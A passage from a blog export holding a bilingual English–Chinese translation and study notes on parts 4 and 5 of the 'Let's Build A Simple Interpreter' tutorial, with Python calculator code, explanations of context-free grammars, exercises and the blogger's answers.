skip_whitespace(self): while self.current_char is not None and self.current_char.isspace(): self.advance() def integer(self): &quot;&quot;&quot;Return a (multidigit) integer consumed from the input.&quot;&quot;&quot; result = '' while self.current_char is not None and self.current_char.isdigit(): result += self.current_char self.advance() return int(result) def get_next_token(self): &quot;&quot;&quot;Lexical analyzer (also known as scanner or tokenizer) This method is responsible for breaking a sentence apart into tokens. One token at a time. &quot;&quot;&quot; while self.current_char is not None: if self.current_char.isspace(): self.skip_whitespace() continue if self.current_char.isdigit(): return Token(INTEGER, self.integer()) if self.current_char == '+': self.advance() return Token(PLUS, '+') if self.current_char == '-': self.advance() return Token(MINUS, '-') if self.current_char == '*': self.advance() return Token(MUL, '*') if self.current_char == '/': self.advance() return Token(DIV, '/') self.error() return Token(EOF, None) class Interpreter(object): def __init__(self, lexer): self.lexer = lexer # set current token to the first token taken from the input self.current_token = self.lexer.get_next_token() def error(self): raise Exception('Invalid syntax') def eat(self, token_type): # compare the current token type with the passed token # type and if they match then &quot;eat&quot; the current token # and assign the next token to the self.current_token, # otherwise raise an exception. if self.current_token.type == token_type: self.current_token = self.lexer.get_next_token() else: self.error() def factor(self): &quot;&quot;&quot;factor : INTEGER&quot;&quot;&quot; token = self.current_token self.eat(INTEGER) return token.value def term(self): &quot;&quot;&quot;term : factor ((MUL | DIV) factor)*&quot;&quot;&quot; result = self.factor() while self.current_token.type in (MUL, DIV): token = self.current_token if token.type == MUL: self.eat(MUL) result = result * self.factor() elif token.type == DIV: self.eat(DIV) result = result // self.factor() return result def expr(self): &quot;&quot;&quot;Arithmetic expression parser / interpreter. calc&gt; 14 + 2 * 3 - 6 / 2 17 expr : term ((PLUS | MINUS) term)* term : factor ((MUL | DIV) factor)* factor : INTEGER &quot;&quot;&quot; result = self.term() while self.current_token.type in (PLUS, MINUS): token = self.current_token if token.type == PLUS: self.eat(PLUS) result = result + self.term() elif token.type == MINUS: self.eat(MINUS) result = result - self.term() return result def main(): while True: try: text = input('calc&gt; ') except EOFError: break if not text: continue lexer = Lexer(text) interpreter = Interpreter(lexer) result = interpreter.expr() print(result) if __name__ == '__main__': main() Save the above code into the calc5.py file or download it directly from GitHub. As usual, try it out and see for yourself that the interpreter properly evaluates arithmetic expressions that have operators with different precedence. 将上面的代码保存到 calc5.py 文件中，或者直接从 GitHub 下载。像往常一样，试一试，亲自看看解释器是否正确地计算优先级不同的运算符的算术表达式。 Here is a sample session on my laptop: 下面是我笔记本电脑上的一个例子: $ python calc5.py calc&gt; 3 3 calc&gt; 2 + 7 * 4 30 calc&gt; 7 - 8 / 4 5 calc&gt; 14 + 2 * 3 - 6 / 2 17 Here are new exercises for today: 以下是今天的新练习: Write an interpreter as described in this article off the top of your head, without peeking into the code from the article. Write some tests for your interpreter, and make sure they pass. 根据本文的描述写一个解释器，不要偷看文章中的代码。为你的解释器编写一些测试，并确保它们通过。 Extend the interpreter to handle arithmetic expressions containing parentheses so that your interpreter could evaluate deeply nested arithmetic expressions like: 7 + 3 * (10 / (12 / (3 + 1) - 1)) 扩展解释器以处理包含括号的算术表达式，这样你的解释器就可以计算深嵌套的算术表达式，比如: 7 + 3 * (10/(12/(3 + 1)-1)) Check your understanding. 检查你的理解。 What does it mean for an operator to be _left-associative ? _ 当两边都有同一个操作符的操作数属于左边的操作符时，说该操作符是左关联的 Are operators + and - _left-associative _ or _right-associative _? What about * and / ? +和-都是左关联，*和/也是左关联 Does operator + have _higher precedence _than operator * ? *有更高的优先级 Hey, you read all the way to the end! That’s really great. I’ll be back next time with a new article - stay tuned, be brilliant, and, as usual, don’t forget to do the exercises. 嘿，你从头读到尾！真是太好了。下次我会带着一篇新文章回来——继续关注，保持精彩，像往常一样，不要忘记做练习。 Here is a list of books I recommend that will help you in your study of interpreters and compilers: 以下是我推荐的一些书籍，它们可以帮助你学习解释器和编译器: Language Implementation Patterns: Create Your Own Domain-Specific and General Programming Languages (Pragmatic Programmers) 语言实现模式: 创建您自己的特定领域和通用编程语言(实用程序员) Writing Compilers and Interpreters: A Software Engineering Approach 编写编译器和解释器: 一种软件工程方法 Modern Compiler Implementation in Java 现代编译器在 Java 中的实现 Modern Compiler Design 现代编译器设计 Compilers: Principles, Techniques, and Tools (2nd Edition) 编译器: 原理、技术和工具(第二版) If you want to get my newest articles in your inbox, then enter your email address below and click &quot;Get Updates!&quot; All articles in this series: Let's Build A Simple Interpreter. Part 1. Let's Build A Simple Interpreter. Part 2. Let's Build A Simple Interpreter. Part 3. Let's Build A Simple Interpreter. Part 4. Let's Build A Simple Interpreter. Part 5. Let's Build A Simple Interpreter. Part 6. Let's Build A Simple Interpreter. Part 7: Abstract Syntax Trees Let's Build A Simple Interpreter. Part 8. Let's Build A Simple Interpreter. Part 9. Let's Build A Simple Interpreter. Part 10. Let's Build A Simple Interpreter. Part 11. Let's Build A Simple Interpreter. Part 12. Let's Build A Simple Interpreter. Part 13: Semantic Analysis Let's Build A Simple Interpreter. Part 14: Nested Scopes and a Source-to-Source Compiler Let's Build A Simple Interpreter. Part 15. Let's Build A Simple Interpreter. Part 16: Recognizing Procedure Calls Let's Build A Simple Interpreter. Part 17: Call Stack and Activation Records Let's Build A Simple Interpreter. Part 18: Executing Procedure Calls Let's Build A Simple Interpreter. Part 19: Nested Procedure Calls ","link":"https://lzxzl.github.io/post/fan-yi-yu-xue-xi-lets-build-a-simple-interpreter-part5/"},{"title":"[翻译与学习] Let’s Build A Simple Interpreter. Part4.","content":"Have you been passively learning the material in these articles or have you been actively practicing it? I hope you’ve been actively practicing it. I really do 😃 你是被动地学习这些文章中的内容，还是主动地练习？我希望你已经积极练习过了。我真的是这么想的:) Remember what Confucius said? 还记得孔子说过什么吗？ “I hear and I forget.” “I see and I remember.” “I do and I understand.” 其实是荀子说的：“不闻不若闻之，闻之不若见之，见之不若知之，知之不若行之。” In the previous article you learned how to parse (recognize) and interpret arithmetic expressions with any number of plus or minus operators in them, for example “7 - 3 + 2 - 1”. You also learned about syntax diagrams and how they can be used to specify the syntax of a programming language. 在前一篇文章中，你学习了如何解析（识别）和解释带有任意数量的加减运算符的算术表达式，例如“7-3 + 2-1”。你还了解了语法（syntax）图，以及如何使用它们指定编程语言的语法。 Today you’re going to learn how to parse and interpret arithmetic expressions with any number of multiplication and division operators in them, for example “7 * 4 / 2 * 3”. The division in this article will be an integer division, so if the expression is “9 / 4”, then the answer will be an integer: 2. 今天，你将学习如何解析和解释带有任意数量乘法和除法运算符的算术表达式，例如“7 * 4/2 * 3”。本文中的除法是整数除法，因此如果表达式是“9/4”，那么答案将是整数: 2。 I will also talk quite a bit today about another widely used notation for specifying the syntax of a programming language. It’s called context-free grammars (grammars, for short) or BNF (Backus-Naur Form). For the purpose of this article I will not use pure BNF notation but more like a modified EBNF notation. 今天我还将相当详细地讨论另一种广泛使用的用于指定编程语言语法的符号。它被称为上下文无关文法(简称grammar)或 BNF (Backus-Naur Form)。基于本文的目的，我将不使用纯 BNF 符号，而更像是一种修改后的 EBNF 符号。 Here are a couple of reasons to use grammars: 以下是使用grammar的几个原因: A grammar specifies the syntax of a programming language in a concise manner. Unlike syntax diagrams, grammars are very compact. You will see me using grammars more and more in future articles. grammar以简洁的方式指定了编程语言的syntax。与语法（syntax）图不同，grammar非常紧凑。在以后的文章中，你会看到我越来越多地使用grammar。 A grammar can serve as great documentation. grammar可以作为很好的文档 A grammar is a good starting point even if you manually write your parser from scratch. Quite often you can just convert the grammar to code by following a set of simple rules. 即使你从头开始手动编写解析器，grammar也是一个很好的起点。通常情况下，你只需遵循一组简单的规则就可以将grammar转换为代码。 There is a set of tools, called parser generators, which accept a grammar as an input and automatically generate a parser for you based on that grammar. I will talk about those tools later on in the series. 有一组名为”Parser生成器”的工具，接受grammar作为输入，并根据该grammar自动为您生成解析器。稍后会谈论那些工具。 Now, let’s talk about the mechanical aspects of grammars, shall we? 现在，让我们来谈谈grammar，好吗？ Here is a grammar that describes arithmetic expressions like “7 * 4 / 2 * 3” (it’s just one of the many expressions that can be generated by the grammar): 下面是一个描述算术表达式的grammar，比如“7 * 4/2 * 3”(这只是由grammar生成的众多表达式之一) : A grammar consists of a sequence of rules, also known as productions. There are two rules in our grammar: grammar由一系列的规则（也称为_productions（产生式）_）组成。我们的grammar有两个规则: A rule consists of a non-terminal, called the head or left-hand side of the production, a colon, and a sequence of terminals and/or non-terminals, called the body or right-hand side of the production: 一个规则由一个非终结符(称为production的head或left-hand side)、冒号和一系列终结符/非终结符(称为production的body或right-hand side)组成: In the grammar I showed above, tokens like MUL, DIV, and INTEGER are called terminals and variables like expr and factor are called non-terminals. Non-terminals usually consist of a sequence of terminals and/or non-terminals: 在上面展示的grammar中，像 MUL、 DIV 和 INTEGER 这样的token称为终结符，像 expr 和 factor 这样的变量称为非终结符。非终结符通常由一系列终结符和或非终结符组成: The non-terminal symbol on the left side of the first rule is called the start symbol. In the case of our grammar, the start symbol is expr: 第一条规则左侧的非终结符称为开始符号。在我们的grammar中，开始符号是 expr: You can read the rule expr as “An expr can be a factor optionally followed by a multiplication or division operator followed by another factor, which in turn is optionally followed by a multiplication or division operator followed by another factor and so on and so forth.” 你可以将规则 expr 解读为“ 一个 expr 可以是一个factor，后面跟一个乘法或除法运算符，然后跟另一个factor，再后面跟一个乘法或除法运算符，再后面跟另一个factor，等等。” What is a factor? For the purpose of this article a factor is just an integer. 什么是factor? 在本文中，factor只是一个整数。 Let’s quickly go over the symbols used in the grammar and their meaning. 让我们快速回顾一下grammar中使用的符号及其含义。 | - Alternatives. A bar means “or”. So (MUL | DIV) means either MUL or DIV. 二选一。或者的意思，所以（MUL｜DIV）意味着要么是MUL，要么是DIV ( … ) - An open and closing parentheses mean grouping of terminals and/or non-terminals as in (MUL | DIV). 开括号和闭括号表示终结符 和或 非终结符 的分组，如(MUL | DIV)。 ( … )* - Match contents within the group zero or more times. 匹配组内的内容0次或多次 If you worked with regular expressions in the past, then the symbols |, (), and (…)* should be pretty familiar to you. 如果你过去使用过正则表达式，那么符号 | 、()和(...) * 对你来说应该非常熟悉。 A grammar defines a language by explaining what sentences it can form. This is how you can derive an arithmetic expression using the grammar: first you begin with the start symbol expr and then repeatedly replace a non-terminal by the body of a rule for that non-terminal until you have generated a sentence consisting solely of terminals. Those sentences form a language defined by the grammar. grammar通过解释该语言可以构成什么样的句子来定义一种语言。这就是使用grammar派生算术表达式的方法: 首先从开始符号 expr 开始，然后用该非终结符的规则body重复替换非终结符，直到生成完全由终结符组成的句子。这些句子构成了由grammar定义的语言。 If the grammar cannot derive a certain arithmetic expression, then it doesn’t support that expression and the parser will generate a syntax error when it tries to recognize the expression. 如果grammar无法派生出某个算术表达式，那么它就不支持该表达式，解析器在尝试识别该表达式时将产生语法错误。 I think a couple of examples are in order. This is how the grammar derives the expression 3: 我认为举几个例子是合理的。 这是grammar如何派生表达式3: This is how the grammar derives the expression 3 * 7: 这是语法如何派生表达式3 * 7: And this is how the grammar derives the expression 3 * 7 / 2: 这是语法如何派生表达式3 * 7/2: Whoa, quite a bit of theory right there! 哇，真是一大堆理论！ I think when I first read about grammars, the related terminology, and all that jazz, I felt something like this: 我想当我第一次读到grammar，相关的术语，以及所有的jazz的时候，我的感觉是这样的: I can assure you that I definitely was not like this: 我可以向你保证，我绝对不是这样的: It took me some time to get comfortable with the notation, how it works, and its relationship with parsers and lexers, but I have to tell you that it pays to learn it in the long run because it’s so widely used in practice and compiler literature that you’re bound to run into it at some point. So, why not sooner rather than later? 😃 我花了一些时间来熟悉这个符号，它是如何工作的，以及它与语法分析器和词法分析器的关系，但我必须告诉你，从长远来看，学习它是值得的，因为它在实践和编译文献中被广泛使用，你在某个时候一定会遇到它。那么，为什么不早一点而不是晚一点呢？😃 Now, let’s map that grammar to code, okay? 现在，让我们把grammar映射到代码中，好吗？ Here are the guidelines that we will use to convert the grammar to source code. By following them, you can literally translate the grammar to a working parser: 下面是我们将用来将gramar转换为源代码的指导原则。通过跟随它们，你可以逐字地将grammar翻译成一个可以工作的解析器: Each rule, R, defined in the grammar, becomes a method with the same name, and references to that rule become a method call: R(). The body of the method follows the flow of the body of the rule using the very same guidelines. 在grammar中定义的每个规则R都成为一个具有相同名称的方法，以及对该规则的引用成为方法调用：R（）。该方法的方法体（即函数内容）使用相同的指导原则去变换规则（产生式）的body。 Alternatives (a1 | a2 | aN) become an if-elif-else statement 或（Alternatives） 变成一个 if-elif-else语句 An optional grouping (…)* becomes a while statement that can loop over zero or more times 一个可选组**(...)***变成一个可循环0次或多次的while语句 Each token reference T becomes a call to the method eat: eat(T). The way the eat method works is that it consumes the token T if it matches the current lookahead token, then it gets a new token from the lexer and assigns that token to the current_token internal variable. 每个token引用T都成为对方法eat: eat(T)的调用。eat方法的工作方式是：如果token T的类型与当前内部变量current_token的类型相匹配，那么它将吃掉token T，然后从lexer获得一个新token，并将该token分配给current_token。 Visually the guidelines look like this: 视觉上的指导原则是这样的: Let’s get moving and convert our grammar to code following the above guidelines. 让我们按照上面的指导方针，将grammar转换为代码。 There are two rules in our grammar: one expr rule and one factor rule. Let’s start with the factor rule (production). According to the guidelines, you need to create a method called factor (guideline 1) that has a single call to the eat method to consume the INTEGER token (guideline 4): 我们的grammar中有两个规: 一个 expr 规则和一个factor规则。让我们从factor规则（产生式production）开始。根据指导原则，您需要创建一个名为 factor （指导原则1）的方法，该方法只调用 eat 方法来使用 INTEGER 标记（指导原则4） : def factor(self): self.eat(INTEGER) That was easy, wasn’t it? 这很简单，不是吗？ Onward! 前进！ The rule expr becomes the expr method (again according to the guideline 1). The body of the rule starts with a reference to factor that becomes a factor() method call. The optional grouping (…)* becomes a while loop and (MUL | DIV) alternatives become an if-elif-else statement. By combining those pieces together we get the following expr method: 规则 expr 成为 expr 方法(根据指导原则1)。规则体以对 factor 的引用开始，那么expr方法以调用factor()开始。可选的分组(...) * 变成 while 循环，(MUL | DIV)替代项变成 if-elif-else 语句。通过将这些片段组合在一起，我们得到了下面的 expr 方法: def expr(self): self.factor() while self.current_token.type in (MUL, DIV): token = self.current_token if token.type == MUL: self.eat(MUL) self.factor() elif token.type == DIV: self.eat(DIV) self.factor() Please spend some time and study how I mapped the grammar to the source code. Make sure you understand that part because it’ll come in handy later on. 请花些时间研究一下我是如何将grammar映射到源代码的。确保你理解了这一部分，因为它迟早会派上用场。 For your convenience I put the above code into the parser.py file that contains a lexer and a parser without an interpreter. You can download the file directly from GitHub and play with it. It has an interactive prompt where you can enter expressions and see if they are valid: that is, if the parser built according to the grammar can recognize the expressions. 为了方便起见，我将上面的代码放到 parser.py 文件中，该文件包含一个 lexer 和一个不带解释器的解析器。你可以直接从 GitHub 下载这个文件并使用它。它有一个交互式提示符，您可以在其中输入表达式并查看它们是否有效：也就是说，如果根据grammar构建的解析器能够识别表达式。 Here is a sample session that I ran on my computer: 下面是我在电脑上运行的一个例子: $ python parser.py calc&gt; 3 calc&gt; 3 * 7 calc&gt; 3 * 7 / 2 calc&gt; 3 * Traceback (most recent call last): File &quot;parser.py&quot;, line 155, in &lt;module&gt; main() File &quot;parser.py&quot;, line 151, in main parser.parse() File &quot;parser.py&quot;, line 136, in parse self.expr() File &quot;parser.py&quot;, line 130, in expr self.factor() File &quot;parser.py&quot;, line 114, in factor self.eat(INTEGER) File &quot;parser.py&quot;, line 107, in eat self.error() File &quot;parser.py&quot;, line 97, in error raise Exception('Invalid syntax') Exception: Invalid syntax Try it out! 试试吧！ I couldn’t help but mention syntax diagrams again. This is how a syntax diagram for the same expr rule will look: 我忍不住又提到了语法（syntax）图。下面是同一个 expr 规则的语法图: It’s about time we dug into the source code of our new arithmetic expression interpreter. Below is the code of a calculator that can handle valid arithmetic expressions containing integers and any number of multiplication and division (integer division) operators. You can also see that I refactored the lexical analyzer into a separate class Lexer and updated the Interpreter class to take the Lexer instance as a parameter: 是时候深入研究我们新的算术表达式解释器的源代码了。下面是一个计算器的代码，它可以处理包含整数和任意数量的乘法和除法（整数除法）运算符的有效算术表达式。你还可以看到，我将词法分析器重构为一个单独的类 Lexer，并更新了 Interpreter 类，将 Lexer 实例作为参数: # Token types # # EOF (end-of-file) token is used to indicate that # there is no more input left for lexical analysis INTEGER, MUL, DIV, EOF = 'INTEGER', 'MUL', 'DIV', 'EOF' class Token(object): def __init__(self, type, value): # token type: INTEGER, MUL, DIV, or EOF self.type = type # token value: non-negative integer value, '*', '/', or None self.value = value def __str__(self): &quot;&quot;&quot;String representation of the class instance. Examples: Token(INTEGER, 3) Token(MUL, '*') &quot;&quot;&quot; return 'Token({type}, {value})'.format( type=self.type, value=repr(self.value) ) def __repr__(self): return self.__str__() class Lexer(object): def __init__(self, text): # client string input, e.g. &quot;3 * 5&quot;, &quot;12 / 3 * 4&quot;, etc self.text = text # self.pos is an index into self.text self.pos = 0 self.current_char = self.text[self.pos] def error(self): raise Exception('Invalid character') def advance(self): &quot;&quot;&quot;Advance the `pos` pointer and set the `current_char` variable.&quot;&quot;&quot; self.pos += 1 if self.pos &gt; len(self.text) - 1: self.current_char = None # Indicates end of input else: self.current_char = self.text[self.pos] def skip_whitespace(self): while self.current_char is not None and self.current_char.isspace(): self.advance() def integer(self): &quot;&quot;&quot;Return a (multidigit) integer consumed from the input.&quot;&quot;&quot; result = '' while self.current_char is not None and self.current_char.isdigit(): result += self.current_char self.advance() return int(result) def get_next_token(self): &quot;&quot;&quot;Lexical analyzer (also known as scanner or tokenizer) This method is responsible for breaking a sentence apart into tokens. One token at a time. &quot;&quot;&quot; while self.current_char is not None: if self.current_char.isspace(): self.skip_whitespace() continue if self.current_char.isdigit(): return Token(INTEGER, self.integer()) if self.current_char == '*': self.advance() return Token(MUL, '*') if self.current_char == '/': self.advance() return Token(DIV, '/') self.error() return Token(EOF, None) class Interpreter(object): def __init__(self, lexer): self.lexer = lexer # set current token to the first token taken from the input self.current_token = self.lexer.get_next_token() def error(self): raise Exception('Invalid syntax') def eat(self, token_type): # compare the current token type with the passed token # type and if they match then &quot;eat&quot; the current token # and assign the next token to the self.current_token, # otherwise raise an exception. if self.current_token.type == token_type: self.current_token = self.lexer.get_next_token() else: self.error() def factor(self): &quot;&quot;&quot;Return an INTEGER token value. factor : INTEGER &quot;&quot;&quot; token = self.current_token self.eat(INTEGER) return token.value def expr(self): &quot;&quot;&quot;Arithmetic expression parser / interpreter. expr : factor ((MUL | DIV) factor)* factor : INTEGER &quot;&quot;&quot; result = self.factor() while self.current_token.type in (MUL, DIV): token = self.current_token if token.type == MUL: self.eat(MUL) result = result * self.factor() elif token.type == DIV: self.eat(DIV) result = result // self.factor() return result def main(): while True: try: text = input('calc&gt; ') except EOFError: break if not text: continue lexer = Lexer(text) interpreter = Interpreter(lexer) result = interpreter.expr() print(result) if __name__ == '__main__': main() Save the above code into the calc4.py file or download it directly from GitHub. As usual, try it out and see for yourself that it works. 将上面的代码保存到 calc4.py 文件中，或者直接从 GitHub 下载。像往常一样，尝试一下，看看它是否有效。 This is a sample session that I ran on my laptop: 这是我在笔记本电脑上运行的一个示例会话: $ python calc4.py calc&gt; 7 * 4 / 2 14 calc&gt; 7 * 4 / 2 * 3 42 calc&gt; 10 * 4 * 2 * 3 / 8 30 I know you couldn’t wait for this part 😃 Here are new exercises for today: 我知道你已经迫不及待了:)这里是今天的新练习: Write a grammar that describes arithmetic expressions containing any number of +, -, *, or / operators. With the grammar you should be able to derive expressions like “2 + 7 * 4”, “7 - 8 / 4”, “14 + 2 * 3 - 6 / 2”, and so on. 编写一种 grammar，描述包含任意数量的 + 、-、 * 或/运算符的算术表达式。使用这种语法，你应该能够派生出“2 + 7 * 4”、“7-8/4”、“14 + 2 * 3-6/2”等表达式 Using the grammar, write an interpreter that can evaluate arithmetic expressions containing any number of +, -, *, or / operators. Your interpreter should be able to handle expressions like “2 + 7 * 4”, “7 - 8 / 4”, “14 + 2 * 3 - 6 / 2”, and so on. 使用grammar，编写一个解释器，它可以计算包含任意数量的 + 、-、 * 或/运算符的算术表达式。你的解释器应该能够处理“2 + 7 * 4”、“7-8/4”、“14 + 2 * 3-6/2”等表达式 If you’ve finished the above exercises, relax and enjoy 😃 如果你已经完成了上面的练习，放松并且享受:) 我的答案（阅读完part5文字之后写的）： expr : term ((PLUS|MINUS)term)* term : factor ((MUL|DIV)factor)* factor : INTEGER # Token types # # EOF (end-of-file) token is used to indicate that # there is no more input left for lexical analysis INTEGER, MUL, DIV,PLUS, MINUS, EOF = 'INTEGER', 'MUL', 'DIV', 'PLUS','MINUS','EOF' class Token(object): def __init__(self, type, value): # token type: INTEGER, MUL, DIV, or EOF self.type = type # token value: non-negative integer value, '*', '/', or None self.value = value def __str__(self): &quot;&quot;&quot;String representation of the class instance. Examples: Token(INTEGER, 3) Token(MUL, '*') &quot;&quot;&quot; return 'Token({type}, {value})'.format( type=self.type, value=repr(self.value) ) def __repr__(self): return self.__str__() class Lexer(object): def __init__(self, text): # client string input, e.g. &quot;3 * 5&quot;, &quot;12 / 3 * 4&quot;, etc self.text = text # self.pos is an index into self.text self.pos = 0 self.current_char = self.text[self.pos] def error(self): raise Exception('Invalid character') def advance(self): &quot;&quot;&quot;Advance the `pos` pointer and set the `current_char` variable.&quot;&quot;&quot; self.pos += 1 if self.pos &gt; len(self.text) - 1: self.current_char = None # Indicates end of input else: self.current_char = self.text[self.pos] def skip_whitespace(self): while self.current_char is not None and self.current_char.isspace(): self.advance() def integer(self): &quot;&quot;&quot;Return a (multidigit) integer consumed from the input.&quot;&quot;&quot; result = '' while self.current_char is not None and self.current_char.isdigit(): result += self.current_char self.advance() return int(result) def get_next_token(self): &quot;&quot;&quot;Lexical analyzer (also known as scanner or tokenizer) This method is responsible for breaking a sentence apart into tokens. One token at a time. &quot;&quot;&quot; while self.current_char is not None: if self.current_char.isspace(): self.skip_whitespace() continue if self.current_char.isdigit(): return Token(INTEGER, self.integer()) if self.current_char == '+': self.advance() return Token(PLUS,'+') if self.current_char == '-': self.advance() return Token(MINUS,'-') if self.current_char == '*': self.advance() return Token(MUL, '*') if self.current_char == '/': self.advance() return Token(DIV, '/') self.error() return Token(EOF, None) class Interpreter(object): def __init__(self, lexer): self.lexer = lexer # set current token to the first token taken from the input self.current_token = self.lexer.get_next_token() def error(self): raise Exception('Invalid syntax') def eat(self, token_type): # compare the current token type with the passed token # type and if they match then &quot;eat&quot; the current token # and assign the next token to the self.current_token, # otherwise raise an exception. if self.current_token.type == token_type: self.current_token = self.lexer.get_next_token() else: self.error() def factor(self): &quot;&quot;&quot;Return an INTEGER token value. factor : INTEGER &quot;&quot;&quot; token = self.current_token self.eat(INTEGER) return token.value def term(self): result = self.factor() while self.current_token.type in (MUL, DIV): token = self.current_token if token.type == MUL: self.eat(MUL) result = result * self.factor() elif token.type == DIV: self.eat(DIV) result = result // self.factor() return result def expr(self): &quot;&quot;&quot;Arithmetic expression parser / interpreter. expr : factor ((MUL | DIV) factor)* factor : INTEGER &quot;&quot;&quot; result = self.term() while self.current_token.type in (PLUS, MINUS): token = self.current_token if token.type == PLUS: self.eat(PLUS) result = result + self.term() elif token.type == MINUS: self.eat(MINUS) result = result - self.term() return result def main(): while True: try: text = input('calc&gt; ') except EOFError: break if not text: continue lexer = Lexer(text) interpreter = Interpreter(lexer) result = interpreter.expr() print(result) if __name__ == '__main__': main() Check your understanding. 检查你的理解。 Keeping in mind the grammar from today’s article, answer the following questions, referring to the picture below as needed: 记住今天文章的grammar，回答以下问题，根据需要参考下面的图片: What is a context-free grammar (grammar)? 什么是上下文无关文法？ 应该如何理解「上下文无关文法」？ - Towser的回答 - 知乎 https://www.zhihu.com/question/21833944/answer/307309365 ​ @徐辰 回答的特别好。 题主的主要疑惑应该在于：什么是上下文，上下文在哪里？为什么说这个文法上下文无关？ 答案就是：在应用一个产生式进行推导时，前后已经推导出的部分结果就是上下文。上下文无关的意思的，只要文法的定义里有某个产生式，不管一个非终结符前后的串是什么，就可以应用相应的产生式进行推导。（从形式上来看，就是产生式的左边都是单独一个非终结符，即形如 S-&gt; ...，而不是非终结符左右还有别的东西，例如 aSb -&gt; ...） 这么描述有点儿抽象，我举一个自然语言的例子： 上下文无关文法： 产生式： Sent -&gt; S V O S -&gt; 人 | 天 V -&gt; 吃 | 下 O -&gt; 雨 | 雪 | 饭 | 肉 其中英文字母都是非终结符（SVO 分别表示主谓宾），汉字都是终结符。 这个文法可以生成如下句子（共 224=16 种组合，懒得写全了，简单写 7 种意思意思）： ｛人吃饭，天下雨，人吃肉，天下雪，人下雪，天下饭，天吃肉，……｝ 可以看到，其中有一些搭配在语义上是不恰当的，例如“天吃肉”。其（最左）推导过程为： Sent -&gt; SVO -&gt; 天VO -&gt; 天吃O -&gt; 天吃肉 但是上下文无关文法里，因为有“V -&gt; 吃 | 下”这样一条产生式，V 就永远都可以推出“吃”这个词，它并不在乎应用“V -&gt; 吃 | 下”这个产生式进行推导时 V 所在的上下文（在这个例子里，就是”天VO“中 V 左右两边的字符串”天“和”O“）。事实上，在 V 推出“吃”这一步，它的左边是“天”这个词，而”天“和”吃“不搭配，导致最后的句子读起来很奇怪。 那上下文有关文法呢？产生式可以定义为（其中前两条产生式仍是上下文无关的，后四条则是上下文有关的）： Sent -&gt; S V O S -&gt; 人 | 天 人V -&gt; 人吃 天V -&gt; 天下 下O -&gt; 下雨 | 下雪 吃O -&gt; 吃饭 | 吃肉 可以看到，这里对 V 的推导过程施加了约束：虽然 V 还是能推出”吃“和”下“两个词，但是仅仅当 V 左边是”人“时，才允许它推导出”吃“；而当 V 左边是”天“时，允许它推导出”下“。这样通过上下文的约束，就保证了主谓搭配的一致性。类似地，包含 O 的产生式也约束了动宾搭配的一致性。 这样一来，这个语言包含的句子就只有｛人吃饭，天下雨，人吃肉，天下雪｝这四条，都是语义上合理的。 以”人吃饭“为例，推导过程为： Sent -&gt; SVO -&gt; 人VO -&gt; 人吃O -&gt; 人吃饭 其中第三步推导是这样的：非终结符 V 的上文是“人”，因此可以应用“人V -&gt; 人吃”这条产生式，得到“人VO -&gt; 人吃O”。第四步也类似。 而 @范彬 回答的是语法的歧义性，这和 CFG 无关。最简单的例子： 假设有如下上下文无关文法： S -&gt; S1 | S2 S1 -&gt; ab S2 -&gt; AB A -&gt; a B -&gt; b 那么对于 &quot;ab&quot; 这个串，一种推倒方式是 S -&gt; S1 -&gt; ab，另一种是 S -&gt; S2 -&gt; AB -&gt; aB -&gt; ab。前一种要把 &quot;ab&quot; 合起来，后一种要分开，这只是说明该文法有歧义，而不能说这是一个上下文有关文法。事实上，还有一些上下文无关语言是固有歧义的（能产生该语言的每一种上下文无关文法都有歧义）。 How many rules / productions does the grammar have? 语法有多少个规则/产生式？ 多个 图中有两个 What is a terminal? (Identify all terminals in the picture) 什么是终结符? (识别图片中的所有终结符) 像MUL、 DIV 和 INTEGER 这样的token称为终结符 图中的终结符有MUL、DIV、INTEGER What is a non-terminal? (Identify all non-terminals in the picture) 什么是非终结符? (识别图片中的所有非终结符) 像 expr 和 factor 这样的变量称为非终结符 图中的非终结符有factor和expr What is a head of a rule? (Identify all heads / left-hand sides in the picture) 什么是规则的头部? (识别图片中所有的header/left-head sides) 一条规则中冒号左边的终结符是规则的head 图中的header有：expr和factor What is a body of the rule? (Identify all bodies / right-hand sides in the picture) 规则的主体是什么? (识别图片中所有的bodies/right-hand sides) 一条规则中冒号右边的一系列终结符和/或非终结符是规则的body What is the start symbol of a grammar? 语法的开始符号是什么？ 第一条规则左侧的非终结符称为开始符号。 图中的grammar中，开始符号是 expr。 Hey, you read all the way to the end! This post contained quite a bit of theory, so I’m really proud of you that you finished it. 嘿，你从头读到尾！这篇文章包含了相当多的理论，所以我为你完成了它而感到骄傲。 I’ll be back next time with a new article - stay tuned and don’t forget to do the exercises, they will do you good. 下次我会带着一篇新文章回来——请继续关注，别忘了做练习，它们会对你有好处的。 Here is a list of books I recommend that will help you in your study of interpreters and compilers: 以下是我推荐的一些书籍，它们可以帮助你学习解释器和编译器: Language Implementation Patterns: Create Your Own Domain-Specific and General Programming Languages (Pragmatic Programmers) 语言实现模式: 创建您自己的特定领域和通用编程语言(实用程序员) Writing Compilers and Interpreters: A Software Engineering Approach 编写编译器和解释器: 一种软件工程方法 Modern Compiler Implementation in Java 现代编译器在 Java 中的实现 Modern Compiler Design 现代编译器设计 Compilers: Principles, Techniques, and Tools (2nd Edition) 编译器: 原理、技术和工具(第二版) All articles in this series: 本系列的所有文章: Let's Build A Simple Interpreter. Part 1. 让我们构建一个简单的解释器 Let's Build A Simple Interpreter. Part 2. 让我们构建一个简单的解释器 Let's Build A Simple Interpreter. Part 3. 让我们构建一个简单的解释器 Let's Build A Simple Interpreter. Part 4. 让我们构建一个简单的解释器 Let's Build A Simple Interpreter. Part 5. 让我们构建一个简单的解释器 Let's Build A Simple Interpreter. Part 6. 让我们构建一个简单的解释器 Let's Build A Simple Interpreter. Part 7: Abstract Syntax Trees 让我们构建一个简单的解释器。第7部分: 抽象语法树 Let's Build A Simple Interpreter. Part 8. 让我们构建一个简单的解释器 Let's Build A Simple Interpreter. Part 9. 让我们构建一个简单的解释器 Let's Build A Simple Interpreter. Part 10. 让我们构建一个简单的解释器 Let's Build A Simple Interpreter. Part 11. 让我们构建一个简单的解释器 Let's Build A Simple Interpreter. Part 12. 让我们构建一个简单的解释器 Let's Build A Simple Interpreter. Part 13: Semantic Analysis 让我们建立一个简单的解释器。第13部分: 语义分析 Let's Build A Simple Interpreter. Part 14: Nested Scopes and a Source-to-Source Compiler 让我们构建一个简单的解释器。第14部分: 嵌套作用域和源到源编译器 Let's Build A Simple Interpreter. Part 15. 让我们构建一个简单的解释器。第15部分 Let's Build A Simple Interpreter. Part 16: Recognizing Procedure Calls 让我们建立一个简单的解释器。第16部分: 识别过程调用 Let's Build A Simple Interpreter. Part 17: Call Stack and Activation Records 